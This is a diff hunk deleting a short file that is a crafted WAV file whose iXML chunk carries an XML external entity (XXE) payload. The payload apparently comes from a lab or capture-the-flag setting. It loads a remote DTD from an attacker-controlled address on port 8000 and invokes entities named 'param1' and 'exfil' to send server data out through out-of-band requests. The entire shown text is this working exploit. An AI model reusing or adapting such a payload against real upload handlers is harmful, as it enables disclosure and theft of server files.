@@ -1,7 +1,0 @@
-RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://10.10.14.31:8000/s">
-%sp;
-%param1;
-]>
-<r>&exfil;</r>>
